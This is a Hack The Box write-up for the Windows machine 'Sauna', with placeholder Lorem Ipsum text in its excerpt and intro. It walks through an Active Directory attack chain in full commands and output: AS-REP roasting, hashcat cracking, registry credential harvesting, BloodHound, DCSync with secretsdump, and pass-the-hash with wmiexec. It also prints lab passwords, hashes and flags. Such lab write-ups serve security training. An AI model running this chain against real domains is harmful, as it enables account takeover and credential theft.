---
layout: single
title: Sauna - Hack The Box
excerpt: "Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."
date: 2020-02-18
classes: wide
header:
  teaser: /assets/images/htb-writeup-sauna/sauna_logo.png
  teaser_home_page: true
  icon: /assets/images/windows.png
categories:
  - hackthebox
  - infosec
tags:  
  - windows
  - mysql
  - mattermost
  - hashcat
  - rules
---

![](/assets/images/htb-writeup-sauna/sauna_logo.png)

"Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."

----------------


   ██╗   ██╗███████╗███████╗██████╗
   ██║   ██║██╔════╝██╔════╝██╔══██╗
   ██║   ██║███████╗█████╗  ██████╔╝
   ██║   ██║╚════██║██╔══╝  ██╔══██╗
   ╚██████╔╝███████║███████╗██║  ██║
    ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝

1. root@p3:/opt/htb/machines/sauna# nmapAutomatorDirb.sh 10.10.10.175 All
    PORT     STATE SERVICE
    53/tcp   open  domain
    80/tcp   open  http
    88/tcp   open  kerberos-sec
    135/tcp  open  msrpc
    139/tcp  open  netbios-ssn
    389/tcp  open  ldap
    445/tcp  open  microsoft-ds
    464/tcp  open  kpasswd5
    593/tcp  open  http-rpc-epmap
    636/tcp  open  ldapssl
    3268/tcp open  globalcatLDAP
    3269/tcp open  globalcatLDAPssl
    5985/tcp  open  http       Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    |_http-server-header: Microsoft-HTTPAPI/2.0
    |_http-title: Not Found
    9389/tcp  open  mc-nmf     .NET Message Framing
    49667/tcp open  msrpc      Microsoft Windows RPC
    49669/tcp open  ncacn_http Microsoft Windows RPC over HTTP 1.0
    49670/tcp open  msrpc      Microsoft Windows RPC
    49671/tcp open  msrpc      Microsoft Windows RPC
    49682/tcp open  msrpc      Microsoft Windows RPC
    54513/tcp open  msrpc      Microsoft Windows RPC

    PORT    STATE SERVICE VERSION
    53/udp  open  domain  (generic dns response: SERVFAIL)
    | fingerprint-strings:
    |   NBTStat:
    |_    CKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    123/udp open  ntp     NTP v3
    389/udp open  ldap    Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)

    Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows
    Domain: EGOTISTICAL-BANK.LOCAL

    DIRB:
    + http://10.10.10.175/about.html (CODE:200|SIZE:30954)
    + http://10.10.10.175/About.html (CODE:200|SIZE:30954)
    + http://10.10.10.175/blog.html (CODE:200|SIZE:24695)
    + http://10.10.10.175/Blog.html (CODE:200|SIZE:24695)
    + http://10.10.10.175/contact.html (CODE:200|SIZE:15634)
    + http://10.10.10.175/Contact.html (CODE:200|SIZE:15634)
    + http://10.10.10.175/index.html (CODE:200|SIZE:32797)
    + http://10.10.10.175/Index.html (CODE:200|SIZE:32797)
    + http://10.10.10.175/single.html (CODE:200|SIZE:38059)

    NIKTO:
    -


2. We are unable to get anything from rpcclient and smbclient. Browsing the website gives us a few employee names. Create a list of
   possible username conventions - ex. firstname.lastname, f.lastname, flastname etc.
   Use Impacket tool GetNPUsers.py along with user-list to find a user hash.

   root@p3:/opt/impacket/examples# python GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ -usersfile /opt/htb/machines/sauna/unconfirmed-users.txt -format hashcat -dc-ip 10.10.10.175
    Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation

    ..
    $krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:8995861f6896cadd060d7fb65eb0df0b$040996aa8dcad37424ac7fa2109c57776427b378c118b9c48fdfd84421bc0b4def8503894b9787f0f8889e540d6b9a992ca949141c352f18da37c21fa39c0dedcb80baf31e2aa70764fea7a08fe425d2d400d0756dee343234d35cdedd7ade59449b289968d3debd739930c94ed6b9b75307e053603ef41f342a8a233e417d5db28e698175c13ea38b6b9a307441435491f3cd67daef951d07b776203f6a0117afea4a6b3163bf7449be2f2dee1a3b240ef59266ed8caccd7e7a79931b5e71f479b29ff10b0146eb185d34abb17d4225718a64f647b984abce67e555878c10bbd9299f3735d4c692c974a8aba79b59603f7dc30384c76071bed3479feb84bac5

   Crack the hash using hashcat
   root@p3:/opt/htb/machines/sauna# hashcat -m18200 -a0 hash-fsmith.txt /usr/share/wordlists/rockyou.txt -o cracked-fsmith.txt
   root@p3:/opt/htb/machines/sauna# cat cracked-fsmith.txt
    .......:Thestrokes23

  Creds: fsmith:Thestrokes23


3. Login with evil-winrm and grab user.txt
   root@p3:/opt/impacket/examples# evil-winrm -i 10.10.10.175 -u fsmith
    *Evil-WinRM* PS C:\Users\FSmith\Desktop> whoami
      egotisticalbank\fsmith
    *Evil-WinRM* PS C:\Users\FSmith\Desktop> type user.txt
      1b5520b98d97cf17f24122a55baf70cf

██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██████╗  ██████╗  ██████╗ ████████╗
   ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝
   ██████╔╝██║   ██║██║   ██║   ██║
   ██╔══██╗██║   ██║██║   ██║   ██║
   ██║  ██║╚██████╔╝╚██████╔╝   ██║
   ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝


1. Enumerating the box as FSmith gives us the user 'svc_loanmgr'.
   Trying to kerberoat using 'Invoke-Kerberoast.ps1' gives us another user - HSmith

   *Evil-WinRM* PS C:\Users\FSmith> Invoke-Kerberoast -erroraction silentlycontinue -OutputFormat Hashcat
    Warning: [Get-DomainSPNTicket] Error requesting ticket for SPN 'SAUNA/HSmith.EGOTISTICALBANK.LOCAL:60111' from user 'CN=Hugo Smith,DC=EGOTISTICAL-BANK,DC=LOCAL' : Exception calling ".ctor" with "1" argument(s): "The NetworkCredentials provided were unable to create a Kerberos credential, see inner exception for details."


2. This is where I hit a wall, I could not find the creds for svc_loanmgr.
   Windows Registry stores configuration information, and that includes autologon credentials. Querying the registry gives us the
   credentials for user svc_loanmgr.

   *Evil-WinRM* PS C:\Users\FSmith\Documents> reg query HKLM /f password /t REG_SZ /s
      HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{0fafd998-c8e8-42a1-86d7-7c10c664a415}
          (Default)    REG_SZ    Picture Password Enrollment UX

      ------------ SNIP ------------
      HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
          DefaultPassword    REG_SZ    Moneymakestheworldgoround!

      ------------ SNIP ------------

     End of search: 283 match(es) found.

    NOTE: svc_loanmgr:Moneymakestheworldgoround!


3. Login as svc_loadmgr upload BloodHound/SharpHound and look at the path towards Domain Admin.
     root@p3:/opt/impacket/examples# evil-winrm -i 10.10.10.175 -u svc_loanmgr
     *Evil-WinRM* PS C:\Users\svc_loanmgr\Documents> upload ../opt/BloodHound/Ingestors/SharpHound.ps1
         Info: Uploading ../opt/BloodHound/Ingestors/SharpHound.ps1 to C:\Users\svc_loanmgr\Documents\SharpHound.ps1
         Data: 1226060 bytes of 1226060 bytes copied
         Info: Upload successful!

     *Evil-WinRM* PS C:\Users\svc_loanmgr\Documents> import-module C:\Users\svc_loanmgr\Documents\SharpHound.ps1
     *Evil-WinRM* PS C:\Users\svc_loanmgr\Documents> Invoke-BloodHound -CollectionMethod All -Domain EGOTISTICAL-BANK.LOCAL -LDAPUser svc_loanmgr -LDAPPass Moneymakestheworldgoround!
     *Evil-WinRM* PS C:\Users\svc_loanmgr\Documents> download 20200217131222_BloodHound.zip
         Info: Downloading C:\Users\svc_loanmgr\Documents\20200217131222_BloodHound.zip to 20200217131222_BloodHound.zip
         Info: Download successful!

     Looking at the data we can see that svc_loanmgr has DCSync rights, this can be confirmed using aclpwn.

     root@p3:/opt/htb/machines/sauna# aclpwn -f svc_loanmgr@EGOTISTICAL-BANK.LOCAL -d EGOTISTICAL-BANK.LOCAL -s 10.10.10.175
         Please supply the password or LM:NTLM hashes of the account you are escalating from:
         [+] Path found!
         Path: (SVC_LOANMGR@EGOTISTICAL-BANK.LOCAL)-[GetChangesAll]->(EGOTISTICAL-BANK.LOCAL)
         [-] DCSync -> continue
         [+] Finished running tasks


4. Use impacket secretsdump to get the (admin) hashes os all users from the domain.
    root@p3:/opt/htb/machines/sauna# impacket-secretsdump EGOTISTICAL-BANK.LOCAL/svc_loanmgr@sauna.htb -just-dc
      Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

    Password:
      [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
      [*] Using the DRSUAPI method to get NTDS.DIT secrets
      Administrator:500:aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff:::
      Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
      krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
      EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
      EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
      EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::
      SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:7a2965077fddedf348d938e4fa20ea1b:::
      [*] Kerberos keys grabbed
      Administrator:aes256-cts-hmac-sha1-96:987e26bb845e57df4c7301753f6cb53fcf993e1af692d08fd07de74f041bf031
      Administrator:aes128-cts-hmac-sha1-96:145e4d0e4a6600b7ec0ece74997651d0
      Administrator:des-cbc-md5:19d5f15d689b1ce5
      krbtgt:aes256-cts-hmac-sha1-96:83c18194bf8bd3949d4d0d94584b868b9d5f2a54d3d6f3012fe0921585519f24
      krbtgt:aes128-cts-hmac-sha1-96:c824894df4c4c621394c079b42032fa9
      krbtgt:des-cbc-md5:c170d5dc3edfc1d9
      EGOTISTICAL-BANK.LOCAL\HSmith:aes256-cts-hmac-sha1-96:5875ff00ac5e82869de5143417dc51e2a7acefae665f50ed840a112f15963324
      EGOTISTICAL-BANK.LOCAL\HSmith:aes128-cts-hmac-sha1-96:909929b037d273e6a8828c362faa59e9
      EGOTISTICAL-BANK.LOCAL\HSmith:des-cbc-md5:1c73b99168d3f8c7
      EGOTISTICAL-BANK.LOCAL\FSmith:aes256-cts-hmac-sha1-96:8bb69cf20ac8e4dddb4b8065d6d622ec805848922026586878422af67ebd61e2
      EGOTISTICAL-BANK.LOCAL\FSmith:aes128-cts-hmac-sha1-96:6c6b07440ed43f8d15e671846d5b843b
      EGOTISTICAL-BANK.LOCAL\FSmith:des-cbc-md5:b50e02ab0d85f76b
      EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes256-cts-hmac-sha1-96:6f7fd4e71acd990a534bf98df1cb8be43cb476b00a8b4495e2538cff2efaacba
      EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes128-cts-hmac-sha1-96:8ea32a31a1e22cb272870d79ca6d972c
      EGOTISTICAL-BANK.LOCAL\svc_loanmgr:des-cbc-md5:2a896d16c28cf4a2
      SAUNA$:aes256-cts-hmac-sha1-96:a90968c91de5f77ac3b7d938bd760002373f71e14e1a027b2d93d1934d64754a
      SAUNA$:aes128-cts-hmac-sha1-96:0bf0c486c1262ab6cf46b16dc3b1b198
      SAUNA$:des-cbc-md5:b989ecc101ae4ca1
      [*] Cleaning up...

5. Pass the hash using wmiexec and grab root.txt
    root@p3:/opt/impacket/examples# python wmiexec.py -hashes :d9485863c1e9e05851aa40cbb4ab9dff administrator@sauna.htb
      Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation

      [*] SMBv3.0 dialect used
      [!] Launching semi-interactive shell - Careful what you execute
      [!] Press help for extra shell commands

      C:\>whoami
        egotisticalbank\administrator
      C:\Users\Administrator\Desktop>type root.txt
        f3ee04965c68257382e31502cc5e881f


██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██╗███╗   ██╗███████╗ ██████╗ ██████╗ ███╗   ███╗ █████╗ ████████╗██╗ ██████╗ ███╗   ██╗
   ██║████╗  ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║
   ██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██╔████╔██║███████║   ██║   ██║██║   ██║██╔██╗ ██║
   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║╚██╔╝██║██╔══██║   ██║   ██║██║   ██║██║╚██╗██║
   ██║██║ ╚████║██║     ╚██████╔╝██║  ██║██║ ╚═╝ ██║██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║
   ╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝

Creds in Registry:
  https://attack.mitre.org/techniques/T1214/

Similar Boxes:
  Forest  (very similar)
  Monteverde
